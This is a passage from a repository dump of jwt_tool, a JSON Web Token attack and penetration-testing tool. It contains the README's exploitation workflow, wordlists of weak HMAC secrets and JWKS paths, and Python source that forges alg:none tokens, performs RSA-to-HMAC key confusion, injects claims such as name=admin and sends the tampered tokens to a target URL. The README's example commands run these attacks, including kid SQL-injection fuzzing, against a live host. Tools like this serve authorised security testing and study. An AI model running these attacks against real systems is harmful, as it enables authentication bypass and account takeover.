token***)\n* (optional) any POST data (where the request is a POST)\n* (optional) any additional jwt_tool options, such as modes or tampering/injection options  \n* (optional) a *canary value* (-cv) - a text value you expect to see in a successful use of the token (e.g. \"Welcome, ticarpi\")  \nAn example request might look like this (using scanning mode for forced-errors):  \n`$ python3 jwt_tool.py -t https://www.ticarpi.com/ -rc \"jwt=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJsb2dpbiI6InRpY2FycGkifQ.bsSwqj2c2uI9n7-ajmi3ixVGhPUiY7jO9SUn9dm15Po;anothercookie=test\" -rh \"Origin: null\" -cv \"Welcome\" -M er` \n\nVarious responses from the request are displayed:  \n* Response code\n* Response size\n* Unique request tracking ID (for use with logging)\n* Mode/options used\n\n---\n\n## Common Workflow\n\nHere is a quick run-through of a basic assessment of a JWT implementation. If no success with these options then dig deeper into other modes and options to hunt for new vulnerabilities (or zero-days!).  \n\n### Recon:  \nRead the token value to get a feel for the claims/values expected in the application:  \n`$ python3 jwt_tool.py eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJsb2dpbiI6InRpY2FycGkifQ.aqNCvShlNT9jBFTPBpHDbt2gBB1MyHiisSDdp8SQvgw`  \n\n### Scanning:\nRun a ***Playbook Scan*** using the provided token directly against the application to hunt for common misconfigurations:  \n`$ python3 jwt_tool.py -t https://www.ticarpi.com/ -rc \"jwt=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJsb2dpbiI6InRpY2FycGkifQ.bsSwqj2c2uI9n7-ajmi3ixVGhPUiY7jO9SUn9dm15Po;anothercookie=test\" -M pb`  \n\n### Exploitation:\nIf any successful vulnerabilities are found change any relevant claims to try to exploit it (here using the *Inject JWKS* exploit and injecting a new username):  \n`$ python3 jwt_tool.py -t https://www.ticarpi.com/ -rc \"jwt=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJsb2dpbiI6InRpY2FycGkifQ.bsSwqj2c2uI9n7-ajmi3ixVGhPUiY7jO9SUn9dm15Po;anothercookie=test\" -X i -I -pc name -pv admin` \n\n### Fuzzing:\nDig deeper by testing for unexpected values and claims to identify unexpected app behaviours, or run attacks on programming logic or token processing:  \n`$ python3 jwt_tool.py -t https://www.ticarpi.com/ -rc \"jwt=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJsb2dpbiI6InRpY2FycGkifQ.bsSwqj2c2uI9n7-ajmi3ixVGhPUiY7jO9SUn9dm15Po;anothercookie=test\" -I -hc kid -hv custom_sqli_vectors.txt`  \n\n### Review:\nReview any successful exploitation by querying the logs to read more data about the request and :  \n`$ python3 jwt_tool.py -t https://www.ticarpi.com/ -rc \"jwt=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJsb2dpbiI6InRpY2FycGkifQ.bsSwqj2c2uI9n7-ajmi3ixVGhPUiY7jO9SUn9dm15Po;anothercookie=test\" -X i -I -pc name -pv admin`   \n\n---\n\n### Help\nFor a list of options call the usage function:\nSome options such as Verifying tokens require additional parameters/files to be provided:  \n`$ python3 jwt_tool.py -h`\n\n**A more detailed user guide can be found on the [wiki page](https://github.com/ticarpi/jwt_tool/wiki/Using-jwt_tool).**\n\n---\n\n## JWT Attack Playbook - new wiki content!  \n![playbook_logo](https://user-images.githubusercontent.com/57728093/68797806-21f25700-064d-11ea-9baa-c58fb6f75c0b.png)\n\nHead over to the [JWT Attack Playbook](https://github.com/ticarpi/jwt_tool/wiki) for a detailed run-though of what JWTs are, what they do, and a full workflow of how to thoroughly test them for vulnerabilities, common weaknesses and unintended coding errors.\n\n---\n\n## Tips\n**Regex for finding JWTs in Burp Search**  \n*(make sure 'Case sensitive' and 'Regex' options are ticked)*  \n`[= ]eyJ[A-Za-z0-9_-]*\\.[A-Za-z0-9._-]*` - url-safe JWT version  \n`[= ]eyJ[A-Za-z0-9_\\/+-]*\\.[A-Za-z0-9._\\/+-]*` - all JWT versions (higher possibility of false positives)\n\n---\n\n## Further Reading\n* [JWT Attack Playbook (https://github.com/ticarpi/jwt_tool/wiki)](https://github.com/ticarpi/jwt_tool/wiki) - for a thorough JWT testing methodology\n\n* [A great intro to JWTs - https://jwt.io/introduction/](https://jwt.io/introduction/)\n\n* A lot of the initial inspiration for this tool comes from the vulnerabilities discovered by Tim McLean.  \n[Check out his blog on JWT weaknesses here: https://auth0.com/blog/critical-vulnerabilities-in-json-web-token-libraries/](https://auth0.com/blog/critical-vulnerabilities-in-json-web-token-libraries/)  \n\n* A whole bunch of exercises for testing JWT vulnerabilities are provided by [Pentesterlab (https://www.pentesterlab.com)](https://www.pentesterlab.com). I'd highly recommend a PRO subscription if you are interested in Web App Pentesting.  \n\n  *PLEASE NOTE:* This toolkit will solve most of the Pentesterlab JWT exercises in a few seconds when used correctly, however I'd **strongly** encourage you to work through these exercises yourself, working out the structure and the weaknesses. After all, it's all about learning...\n"
        },
        {
          "name": "common-headers.txt",
          "type": "blob",
          "size": 0.0224609375,
          "content": "typ\r\njku\r\nkid\r\nx5u\r\nx5t"
        },
        {
          "name": "common-payloads.txt",
          "type": "blob",
          "size": 0.501953125,
          "content": "iss\r\nsub\r\naud\r\nexp\r\nnbf\r\niat\r\njti\r\nname\r\ngiven_name\r\nfamily_name\r\nmiddle_name\r\nnickname\r\npreferred_username\r\nprofile\r\npicture\r\nwebsite\r\nemail\r\nemail_verified\r\ngender\r\nbirthdate\r\nzoneinfo\r\nlocale\r\nphone_number\r\nphone_number_verified\r\naddress\r\nupdated_at\r\nazp\r\nnonce\r\nauth_time\r\nat_hash\r\nc_hash\r\nacr\r\namr\r\nsub_jwk\r\ncnf\r\nsip_from_tag\r\nsip_date\r\nsip_callid\r\nsip_cseq_num\r\nsip_via_branch\r\norig\r\ndest\r\nmky\r\nevents\r\ntoe\r\ntxn\r\nrph\r\nsid\r\nvot\r\nvtm\r\nattest\r\norigid\r\nact\r\nscope\r\nclient_id\r\nmay_act\r\njcard\r\nat_use_nbr\r\ndiv\r\nopt"
        },
        {
          "name": "jwks-common.txt",
          "type": "blob",
          "size": 0.1376953125,
          "content": "/oauth2/v1/keys\r\n/jwks.json\r\n/.well-known/jwks.json\r\n/.well-known/jwks_uri\r\n/.well-known/openid-configuration/jwks\r\n/openid/connect/jwks.json"
        },
        {
          "name": "jwt-common.txt",
          "type": "blob",
          "size": 1.7490234375,
          "content": "secret\n...\n012345678901234567890123456789XY\n12345\n12345678901234567890123456789012\n61306132616264382D363136322D343163332D383364362D316366353539623436616663\n61306132616264382d363136322d343163332d383364362d316366353539623436616663\n872e4e50ce9990d8b041330c47c9ddd11bec6b503ae9386a99da8584e9bb12c4\n8zUpiGcaPkNhNGi8oyrq\nA43CC200A1BD292682598DA42DAA9FD14589F3D8BF832FFA206BE775259EE1EA\nC2A4EB068AF8ABEF18D80B1689C7D785\nGQDstcKsx0NHjPOuXOYg5MbeJ1XT0uFiwDVvVBrk\nHello, World!\nJ5hZTw1vtee0PGaoAuaW\n[107 105 97 108 105]\nkiali\nMy super secret key!\nOriginal secret string\nR9MyWaEoyiMYViVWo8Fk4TUGWiSoaW6U1nOqXri8_XU\nRfxRP43BIKoSQ7P1GfeO\nSecret key. You can use `mix guardian.gen.secret` to get one\nSecretKey\nSetec Astronomy\nSignerTest\nSuper Secret Key\nTHE_SAME_HMAC_KEY\nThisIsMySuperSecret\nXYZ\nYOUR_HMAC_KEY\nYoUR sUpEr S3krEt 1337 HMAC kEy HeRE\n]V@IaC1%fU,DrVI\n`mix guardian.gen.secret`\na43cc200a1bd292682598da42daa9fd14589f3d8bf832ffa206be775259ee1ea\nbanana\nbar\nc2a4eb068af8abef18d80b1689c7d785\nclient_secret_basic\ncustom\ndefault-key\nexample-hmac-key\nexample_key\nfe1a1915a379f3be5394b64d14794932\ngZH75aKtMN3Yj0iPS4hcgUuTwjAzZr9C\nguest\nhard!to-guess_secret\nhas a van\nher key\nhis key\nkey\nkey1\nkey2\nkey3\nkkey\nmix guardian.gen.secret\nmy key\nmy super secret password\nmy$ecretK3y\nmy_very_long_and_safe_secret_key\nmypass\nmysecretkey\nmysupersecretkey\nnewSecret\npassword\nsecret-key\nsecret123\nsecret_key\nsecret_key_here\nsecretkey\nshared-secret\nshared_secret\nshhhhh\nshhhhhhared-secret\nsome-secret-string\nsuper-secret-password\nsuper_fancy_secret\nsupersecret\nsymmetric key\ntest-key\ntesting1\ntoken\ntoo many secrets\ntop secret\nverysecret\nwrong-secret\nxxx\nyour-256-bit-secret\nyour-384-bit-secret\nyour-512-bit-secret\nyour-own-jwt-secret\nyour-top-secret-key\njwt\njwt-secret\nhmac-secret\nhs256-secret\nAC8d83&21Almnis710sds\n"
        },
        {
          "name": "jwt_tool.py",
          "type": "blob",
          "size": 100.2353515625,
          "content": "#!/usr/bin/env python3\n#\n# JWT_Tool version 2.2.7 (28_05_2024)\n# Written by Andy Tyler (@ticarpi)\n# Please use responsibly...\n# Software URL: https://github.com/ticarpi/jwt_tool\n# Web: https://www.ticarpi.com\n# Twitter: @ticarpi\n\njwttoolvers = \"2.2.7\"\nimport ssl\nimport sys\nimport os\nimport re\nimport hashlib\nimport hmac\nimport base64\nimport json\nimport random\nfrom urllib.parse import urljoin, urlparse\nimport argparse\nfrom datetime import datetime\nimport configparser\nfrom http.cookies import SimpleCookie\nfrom collections import OrderedDict\ntry:\n    from Cryptodome.Signature import PKCS1_v1_5, DSS, pss\n    from Cryptodome.Hash import SHA256, SHA384, SHA512\n    from Cryptodome.PublicKey import RSA, ECC\nexcept:\n    print(\"WARNING: Cryptodome libraries not imported - these are needed for asymmetric crypto signing and verifying\")\n    print(\"On most Linux systems you can run the following command to install:\")\n    print(\"python3 -m pip install pycryptodomex\\n\")\n    exit(1)\ntry:\n    from termcolor import cprint\nexcept:\n    print(\"WARNING: termcolor library is not imported - this is used to make the output clearer and oh so pretty\")\n    print(\"On most Linux systems you can run the following command to install:\")\n    print(\"python3 -m pip install termcolor\\n\")\n    exit(1)\ntry:\n    import requests\n    from requests.packages.urllib3.exceptions import InsecureRequestWarning\n    requests.packages.urllib3.disable_warnings(InsecureRequestWarning)\nexcept:\n    print(\"WARNING: Python Requests libraries not imported - these are needed for external service interaction\")\n    print(\"On most Linux systems you can run the following command to install:\")\n    print(\"python3 -m pip install requests\\n\")\n    exit(1)\n# To fix broken colours in Windows cmd/Powershell: uncomment the below two lines. You will need to install colorama: 'python3 -m pip install colorama'\n# import colorama\n# colorama.init()\n\ndef cprintc(textval, colval):\n    if not args.bare:\n        cprint(textval, colval)\n\ndef createConfig():\n    privKeyName = path+\"/jwttool_custom_private_RSA.pem\"\n    pubkeyName = path+\"/jwttool_custom_public_RSA.pem\"\n    ecprivKeyName = path+\"/jwttool_custom_private_EC.pem\"\n    ecpubkeyName = path+\"/jwttool_custom_public_EC.pem\"\n    jwksName = path+\"/jwttool_custom_jwks.json\"\n    proxyHost = \"127.0.0.1\"\n    config = configparser.ConfigParser(allow_no_value=True)\n    config.optionxform = str\n    config['crypto'] = {'pubkey': pubkeyName,\n        'privkey': privKeyName,\n        'ecpubkey': ecpubkeyName,\n        'ecprivkey': ecprivKeyName,\n        'jwks': jwksName}\n    config['customising'] = {'useragent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) jwt_tool',\n        'jwks_kid': 'jwt_tool'}\n    if (os.path.isfile(privKeyName)) and (os.path.isfile(pubkeyName)) and (os.path.isfile(ecprivKeyName)) and (os.path.isfile(ecpubkeyName)) and (os.path.isfile(jwksName)):\n        cprintc(\"Found existing Public and Private Keys - using these...\", \"cyan\")\n        origjwks = open(jwksName, \"r\").read()\n        jwks_b64 = base64.b64encode(origjwks.encode('ascii'))\n    else:\n        # gen RSA keypair\n        pubKey, privKey = newRSAKeyPair()\n        with open(privKeyName, 'w') as test_priv_out:\n            test_priv_out.write(privKey.decode())\n        with open(pubkeyName, 'w') as test_pub_out:\n            test_pub_out.write(pubKey.decode())\n        # gen EC keypair\n        ecpubKey, ecprivKey = newECKeyPair()\n        with open(ecprivKeyName, 'w') as ectest_priv_out:\n            ectest_priv_out.write(ecprivKey)\n        with open(ecpubkeyName, 'w') as ectest_pub_out:\n            ectest_pub_out.write(ecpubKey)\n        # gen jwks\n        new_key = RSA.importKey(pubKey)\n        n = base64.urlsafe_b64encode(new_key.n.to_bytes(256, byteorder='big'))\n        e = base64.urlsafe_b64encode(new_key.e.to_bytes(3, byteorder='big'))\n        jwksbuild = buildJWKS(n, e, \"jwt_tool\")\n        jwksout = {\"keys\": []}\n        jwksout[\"keys\"].append(jwksbuild)\n        fulljwks = json.dumps(jwksout,separators=(\",\",\":\"), indent=4)\n        with open(jwksName, 'w') as test_jwks_out:\n                test_jwks_out.write(fulljwks)\n        jwks_b64 = base64.urlsafe_b64encode(fulljwks.encode('ascii'))\n    config['services'] = {'jwt_tool_version': jwttoolvers,\n        '# To disable the proxy option set this value to: False (no quotes). For Docker installations with a Windows host OS set this to: \"host.docker.internal:8080\"': None, 'proxy': proxyHost+':8080',\n        '# To disable following redirects set this value to: False (no quotes)': None, 'redir': 'True',\n        '# Set this to the URL you are hosting your custom JWKS file (jwttool_custom_jwks.json) - your own server, or maybe use this cheeky reflective URL (https://httpbin.org/base64/{base64-encoded_JWKS_here})': None,\n        'jwksloc': '',\n        'jwksdynamic': 'https://httpbin.org/base64/'+jwks_b64.decode(),\n        '# Set this to the base URL of a Collaborator server, somewhere you can read live logs, a Request Bin etc.': None, 'httplistener': ''}\n    config['input'] = {'wordlist': 'jwt-common.txt',\n        'commonHeaders': 'common-headers.txt',\n        'commonPayloads': 'common-payloads.txt'}\n    config['argvals'] = {'# Set at runtime - changes here are ignored': None,\n        'sigType': '',\n        'targetUrl': '',\n        'cookies': '',\n        'key': '',\n        'keyList': '',\n        'keyFile': '',\n        'headerLoc': '',\n        'payloadclaim': '',\n        'headerclaim': '',\n        'payloadvalue': '',\n        'headervalue': '',\n        'canaryvalue': '',\n        'header': '',\n        'exploitType': '',\n        'scanMode': '',\n        'reqMode': '',\n        'postData': '',\n        'resCode': '',\n        'resSize': '',\n        'resContent': ''}\n    with open(configFileName, 'w') as configfile:\n        config.write(configfile)\n    cprintc(\"Configuration file built - review contents of \\\"jwtconf.ini\\\" to customise your options.\", \"cyan\")\n    cprintc(\"Make sure to set the \\\"httplistener\\\" value to a URL you can monitor to enable out-of-band checks.\", \"cyan\")\n    exit(1)\n\ndef sendToken(token, cookiedict, track, headertoken=\"\", postdata=None):\n    if not postdata:\n        postdata = config['argvals']['postData']\n    url = config['argvals']['targetUrl']\n    headers = {'User-agent': config['customising']['useragent']+\" \"+track}\n    if headertoken:\n        for eachHeader in headertoken:\n            headerName, headerVal = eachHeader.split(\":\",1)\n            headers[headerName] = headerVal.lstrip(\" \")\n    try:\n        if config['services']['redir'] == \"True\":\n            redirBool = True\n        else:\n            redirBool = False\n        if config['services']['proxy'] == \"False\":\n            if postdata:\n                response = requests.post(url, data=postdata, headers=headers, cookies=cookiedict, proxies=False, verify=False, allow_redirects=redirBool)\n            else:\n                response = requests.get(url, headers=headers, cookies=cookiedict, proxies=False, verify=False, allow_redirects=redirBool)\n        else:\n            proxies = {'http': 'http://'+config['services']['proxy'], 'https': 'http://'+config['services']['proxy']}\n            if postdata:\n                response = requests.post(url, data=postdata, headers=headers, cookies=cookiedict, proxies=proxies, verify=False, allow_redirects=redirBool)\n            else:\n                response = requests.get(url, headers=headers, cookies=cookiedict, proxies=proxies, verify=False, allow_redirects=redirBool)\n        if int(response.elapsed.total_seconds()) >= 9:\n            cprintc(\"HTTP response took about 10 seconds or more - could be a sign of a bug or vulnerability\", \"cyan\")\n        return [response.status_code, len(response.content), response.content]\n    except requests.exceptions.ProxyError as err:\n        cprintc(\"[ERROR] ProxyError - check proxy is up and not set to tamper with requests\\n\"+str(err), \"red\")\n        exit(1)\n\ndef parse_dict_cookies(value):\n    cookiedict = {}\n    for item in value.split(';'):\n        item = item.strip()\n        if not item:\n            continue\n        if '=' not in item:\n            cookiedict[item] = None\n            continue\n        name, value = item.split('=', 1)\n        cookiedict[name] = value\n    return cookiedict\n\ndef strip_dict_cookies(value):\n    cookiestring = \"\"\n    for item in value.split(';'):\n        if re.search(r'eyJ[A-Za-z0-9_\\/+-]*\\.eyJ[A-Za-z0-9_\\/+-]*\\.[A-Za-z0-9._\\/+-]*', item):\n            continue\n        else:\n            cookiestring += \"; \"+item\n        cookiestring = cookiestring.lstrip(\"; \")\n    return cookiestring\n\ndef jwtOut(token, fromMod, desc=\"\"):\n    genTime = datetime.now().strftime('%Y-%m-%d %H:%M:%S')\n    idFrag = genTime+str(token)\n    logID = \"jwttool_\"+hashlib.md5(idFrag.encode()).hexdigest()\n    if config['argvals']['targetUrl'] != \"\":\n        curTargetUrl = config['argvals']['targetUrl']\n        p = re.compile(r'eyJ[A-Za-z0-9_\\/+-]*\\.eyJ[A-Za-z0-9_\\/+-]*\\.[A-Za-z0-9._\\/+-]*')\n\n        if config['argvals']['headerloc'] == \"cookies\":\n            cookietoken = p.subn(token, config['argvals']['cookies'], 0)\n        else:\n            cookietoken = [config['argvals']['cookies'],0]\n\n        if config['argvals']['headerloc'] == \"headers\":\n            headertoken = [[],0]\n            for eachHeader in args.headers:\n                try:\n                    headerSub = p.subn(token, eachHeader, 0)\n                    headertoken[0].append(headerSub[0])\n                    if headerSub[1] == 1:\n                        headertoken[1] = 1\n                except:\n                    pass\n        else:\n            headertoken = [[],0]\n            if args.headers:\n                for eachHeader in args.headers:\n                        headertoken[0].append(eachHeader)\n\n        if config['argvals']['headerloc'] == \"postdata\":\n            posttoken = p.subn(token, config['argvals']['postdata'], 0)\n        else:\n            posttoken = [config['argvals']['postdata'],0]\n\n\n        try:\n            cookiedict = parse_dict_cookies(cookietoken[0])\n        except:\n            cookiedict = {}\n\n\n\n        # Check if token was included in substitution\n        if cookietoken[1] == 1 or headertoken[1] == 1 or posttoken[1]:\n            resData = sendToken(token, cookiedict, logID, headertoken[0], posttoken[0])\n        else:\n            if config['argvals']['overridesub'] == \"true\":\n                resData = sendToken(token, cookiedict, logID, headertoken[0], posttoken[0])\n            else:\n                cprintc(\"[-] No substitution occurred - check that a token is included in a cookie/header in the request\", \"red\")\n                # cprintc(headertoken, cookietoken, \"cyan\")\n                exit(1)\n        if config['argvals']['canaryvalue']:\n            if config['argvals']['canaryvalue'] in str(resData[2]):\n                cprintc(\"[+] FOUND \\\"\"+config['argvals']['canaryvalue']+\"\\\" in response:\\n\"+logID + \" \" + fromMod + \" Response Code: \" + str(resData[0]) + \", \" + str(resData[1]) + \" bytes\", \"green\")\n            else:\n                cprintc(logID + \" \" + fromMod + \" Response Code: \" + str(resData[0]) + \", \" + str(resData[1]) + \" bytes\", \"cyan\")\n        else:\n            if 200 <= resData[0] < 300:\n                cprintc(logID + \" \" + fromMod + \" Response Code: \" + str(resData[0]) + \", \" + str(resData[1]) + \" bytes\", \"green\")\n            elif 300 <= resData[0] < 400:\n                cprintc(logID + \" \" + fromMod + \" Response Code: \" + str(resData[0]) + \", \" + str(resData[1]) + \" bytes\", \"cyan\")\n            elif 400 <= resData[0] < 600:\n                cprintc(logID + \" \" + fromMod + \" Response Code: \" + str(resData[0]) + \", \" + str(resData[1]) + \" bytes\", \"red\")\n    else:\n        if desc != \"\":\n            cprintc(logID+\" - \"+desc, \"cyan\")\n        if not args.bare:\n            cprintc(\"[+] \"+token, \"green\")\n        else:\n            print(token)\n        curTargetUrl = \"Not sent\"\n    additional = \"[Commandline request: \"+' '.join(sys.argv[0:])+']'\n    setLog(token, genTime, logID, fromMod, curTargetUrl, additional)\n    try:\n        config['argvals']['rescode'],config['argvals']['ressize'],config['argvals']['rescontent'] = str(resData[0]),str(resData[1]),str(resData[2])\n    except:\n        pass\n\ndef setLog(jwt, genTime, logID, modulename, targetURL, additional):\n    logLine = genTime+\" | \"+modulename+\" | \"+targetURL+\" | \"+additional\n    with open(logFilename, 'a') as logFile:\n        logFile.write(logID+\" - \"+logLine+\" - \"+jwt+\"\\n\")\n    return logID\n\ndef buildHead(alg, headDict):\n    newHead = headDict\n    newHead[\"alg\"] = alg\n    newHead = base64.urlsafe_b64encode(json.dumps(newHead,separators=(\",\",\":\")).encode()).decode('UTF-8').strip(\"=\")\n    return newHead\n\ndef checkNullSig(contents):\n    jwtNull = contents.decode()+\".\"\n    return jwtNull\n\ndef checkAlgNone(headDict, paylB64):\n    alg1 = \"none\"\n    newHead1 = buildHead(alg1, headDict)\n    CVEToken0 = newHead1+\".\"+paylB64+\".\"\n    alg = \"None\"\n    newHead = buildHead(alg, headDict)\n    CVEToken1 = newHead+\".\"+paylB64+\".\"\n    alg = \"NONE\"\n    newHead = buildHead(alg, headDict)\n    CVEToken2 = newHead+\".\"+paylB64+\".\"\n    alg = \"nOnE\"\n    newHead = buildHead(alg, headDict)\n    CVEToken3 = newHead+\".\"+paylB64+\".\"\n    return [CVEToken0, CVEToken1, CVEToken2, CVEToken3]\n\ndef checkPubKeyExploit(headDict, paylB64, pubKey):\n    try:\n        key = open(pubKey).read()\n        cprintc(\"File loaded: \"+pubKey, \"cyan\")\n    except:\n        cprintc(\"[-] File not found\", \"red\")\n        exit(1)\n    newHead = headDict\n    newHead[\"alg\"] = \"HS256\"\n    newHead = base64.urlsafe_b64encode(json.dumps(headDict,separators=(\",\",\":\")).encode()).decode('UTF-8').strip(\"=\")\n    newTok = newHead+\".\"+paylB64\n    newSig = base64.urlsafe_b64encode(hmac.new(key.encode(),newTok.encode(),hashlib.sha256).digest()).decode('UTF-8').strip(\"=\")\n    return newTok, newSig\n\ndef injectpayloadclaim(payloadclaim, injectionvalue):\n    newpaylDict = paylDict\n    newpaylDict[payloadclaim] = castInput(injectionvalue)\n    newPaylB64 = base64.urlsafe_b64encode(json.dumps(newpaylDict,separators=(\",\",\":\")).encode()).decode('UTF-8').strip(\"=\")\n    return newpaylDict, newPaylB64\n\ndef injectheaderclaim(headerclaim, injectionvalue):\n    newheadDict = headDict\n    newheadDict[headerclaim] = castInput(injectionvalue)\n    newHeadB64 = base64.urlsafe_b64encode(json.dumps(newheadDict,separators=(\",\",\":\")).encode()).decode('UTF-8').strip(\"=\")\n    return newheadDict, newHeadB64\n\ndef tamperToken(paylDict, headDict, sig):\n    cprintc(\"\\n====================================================================\\nThis option allows you to tamper with the header, contents and \\nsignature of the JWT.\\n====================================================================\", \"white\")\n    cprintc(\"\\nToken header values:\", \"white\")\n    while True:\n        i = 0\n        headList = [0]\n        for pair in headDict:\n            menuNum = i+1\n            if isinstance(headDict[pair], dict):\n                cprintc(\"[\"+str(menuNum)+\"] \"+pair+\" = JSON object:\", \"green\")\n                for subclaim in headDict[pair]:\n                    cprintc(\"    [+] \"+subclaim+\" = \"+str(headDict[pair][subclaim]), \"green\")\n            else:\n                if type(headDict[pair]) == str:\n                    cprintc(\"[\"+str(menuNum)+\"] \"+pair+\" = \\\"\"+str(headDict[pair])+\"\\\"\", \"green\")\n                else:\n                    cprintc(\"[\"+str(menuNum)+\"] \"+pair+\" = \"+str(headDict[pair]), \"green\")\n            headList.append(pair)\n            i += 1\n        cprintc(\"[\"+str(i+1)+\"] *ADD A VALUE*\", \"white\")\n        cprintc(\"[\"+str(i+2)+\"] *DELETE A VALUE*\", \"white\")\n        cprintc(\"[0] Continue to next step\", \"white\")\n        selection = \"\"\n        cprintc(\"\\nPlease select a field number:\\n(or 0 to Continue)\", \"white\")\n        try:\n            selection = int(input(\"> \"))\n        except:\n            cprintc(\"Invalid selection\", \"red\")\n            exit(1)\n        if selection<len(headList) and selection>0:\n            if isinstance(headDict[headList[selection]], dict):\n                cprintc(\"\\nPlease select a sub-field number for the \"+pair+\" claim:\\n(or 0 to Continue)\", \"white\")\n                newVal = OrderedDict()\n                for subclaim in headDict[headList[selection]]:\n                    newVal[subclaim] = headDict[pair][subclaim]\n                newVal = buildSubclaim(newVal, headList, selection)\n                headDict[headList[selection]] = newVal\n            else:\n                cprintc(\"\\nCurrent value of \"+headList[selection]+\" is: \"+str(headDict[headList[selection]]), \"white\")\n                cprintc(\"Please enter new value and hit ENTER\", \"white\")\n                newVal = input(\"> \")\n            headDict[headList[selection]] = castInput(newVal)\n        elif selection == i+1:\n            cprintc(\"Please enter new Key and hit ENTER\", \"white\")\n            newPair = input(\"> \")\n            cprintc(\"Please enter new value for \"+newPair+\" and hit ENTER\", \"white\")\n            newInput = input(\"> \")\n            headList.append(newPair)\n            headDict[headList[selection]] = castInput(newInput)\n        elif selection == i+2:\n            cprintc(\"Please select a Key to DELETE and hit ENTER\", \"white\")\n            i = 0\n            for pair in headDict:\n                menuNum = i+1\n                cprintc(\"[\"+str(menuNum)+\"] \"+pair+\" = \"+str(headDict[pair]), \"white\")\n                headList.append(pair)\n                i += 1\n            try:\n                delPair = int(input(\"> \"))\n            except:\n                cprintc(\"Invalid selection\", \"red\")\n                exit(1)\n            del headDict[headList[delPair]]\n        elif selection == 0:\n            break\n        else:\n            exit(1)\n    cprintc(\"\\nToken payload values:\", \"white\")\n    while True:\n        comparestamps, expiredtoken = dissectPayl(paylDict, count=True)\n        i = 0\n        paylList = [0]\n        for pair in paylDict:\n            menuNum = i+1\n            paylList.append(pair)\n            i += 1\n        cprintc(\"[\"+str(i+1)+\"] *ADD A VALUE*\", \"white\")\n        cprintc(\"[\"+str(i+2)+\"] *DELETE A VALUE*\", \"white\")\n        if len(comparestamps) > 0:\n            cprintc(\"[\"+str(i+3)+\"] *UPDATE TIMESTAMPS*\", \"white\")\n        cprintc(\"[0] Continue to next step\", \"white\")\n        selection = \"\"\n        cprintc(\"\\nPlease select a field number:\\n(or 0 to Continue)\", \"white\")\n        try:\n            selection = int(input(\"> \"))\n        except:\n            cprintc(\"Invalid selection\", \"red\")\n            exit(1)\n        if selection<len(paylList) and selection>0:\n            if isinstance(paylDict[paylList[selection]], dict):\n                cprintc(\"\\nPlease select a sub-field number for the \"+str(paylList[selection])+\" claim:\\n(or 0 to Continue)\", \"white\")\n                newVal = OrderedDict()\n                for subclaim in paylDict[paylList[selection]]:\n                    newVal[subclaim] = paylDict[paylList[selection]][subclaim]\n                newVal = buildSubclaim(newVal, paylList, selection)\n                paylDict[paylList[selection]] = newVal\n            else:\n                cprintc(\"\\nCurrent value of \"+paylList[selection]+\" is: \"+str(paylDict[paylList[selection]]), \"white\")\n                cprintc(\"Please enter new value and hit ENTER\", \"white\")\n                newVal = input(\"> \")\n                paylDict[paylList[selection]] = castInput(newVal)\n        elif selection == i+1:\n            cprintc(\"Please enter new Key and hit ENTER\", \"white\")\n            newPair = input(\"> \")\n            cprintc(\"Please enter new value for \"+newPair+\" and hit ENTER\", \"white\")\n            newVal = input(\"> \")\n            try:\n                newVal = int(newVal)\n            except:\n                pass\n            paylList.append(newPair)\n            paylDict[paylList[selection]] = castInput(newVal)\n        elif selection == i+2:\n            cprintc(\"Please select a Key to DELETE and hit ENTER\", \"white\")\n            i = 0\n            for pair in paylDict:\n                menuNum = i+1\n                cprintc(\"[\"+str(menuNum)+\"] \"+pair+\" = \"+str(paylDict[pair]), \"white\")\n                paylList.append(pair)\n                i += 1\n            delPair = eval(input(\"> \"))\n            del paylDict[paylList[delPair]]\n        elif selection == i+3:\n            cprintc(\"Timestamp updating:\", \"white\")\n            cprintc(\"[1] Update earliest timestamp to current time (keeping offsets)\", \"white\")\n            cprintc(\"[2] Add 1 hour to timestamps\", \"white\")\n            cprintc(\"[3] Add 1 day to timestamps\", \"white\")\n            cprintc(\"[4] Remove 1 hour from timestamps\", \"white\")\n            cprintc(\"[5] Remove 1 day from timestamps\", \"white\")\n            cprintc(\"\\nPlease select an option from above (1-5):\", \"white\")\n            try:\n                selection = int(input(\"> \"))\n            except:\n                cprintc(\"Invalid selection\", \"red\")\n                exit(1)\n            if selection == 1:\n                nowtime = int(datetime.now().timestamp())\n                timecomp = {}\n                for timestamp in comparestamps:\n                    timecomp[timestamp] = paylDict[timestamp]\n                earliest = min(timecomp, key=timecomp.get)\n                earlytime = paylDict[earliest]\n                for timestamp in comparestamps:\n                    if timestamp == earliest:\n                        paylDict[timestamp] = nowtime\n                    else:\n                        difftime = int(paylDict[timestamp])-int(earlytime)\n                        paylDict[timestamp] = nowtime+difftime\n            elif selection == 2:\n                for timestamp in comparestamps:\n                    newVal = int(paylDict[timestamp])+3600\n                    paylDict[timestamp] = newVal\n            elif selection == 3:\n                for timestamp in comparestamps:\n                    newVal = int(paylDict[timestamp])+86400\n                    paylDict[timestamp] = newVal\n            elif selection == 4:\n                for timestamp in comparestamps:\n                    newVal = int(paylDict[timestamp])-3600\n                    paylDict[timestamp] = newVal\n            elif selection == 5:\n                for timestamp in comparestamps:\n                    newVal = int(paylDict[timestamp])-86400\n                    paylDict[timestamp] = newVal\n            else:\n                cprintc(\"Invalid selection\", \"red\")\n                exit(1)\n        elif selection == 0:\n            break\n        else:\n            exit(1)\n    if config['argvals']['sigType'] == \"\" and config['argvals']['exploitType'] == \"\":\n        cprintc(\"Signature unchanged - no signing method specified (-S or -X)\", \"cyan\")\n        newContents = genContents(headDict, paylDict)\n        desc = \"Tampered token:\"\n        jwtOut(newContents+\".\"+sig, \"Manual Tamper - original signature\", desc)\n    elif config['argvals']['exploitType'] != \"\":\n        runExploits()\n    elif config['argvals']['sigType'] != \"\":\n        signingToken(headDict, paylDict)\n\ndef signingToken(newheadDict, newpaylDict):\n    if config['argvals']['sigType'][0:2] == \"hs\":\n        key = \"\"\n        if args.password:\n            key = config['argvals']['key']\n        elif args.keyfile:\n            key = open(config['argvals']['keyFile']).read()\n        newSig, newContents = signTokenHS(newheadDict, newpaylDict, key, int(config['argvals']['sigType'][2:]))\n        desc = \"Tampered token - HMAC 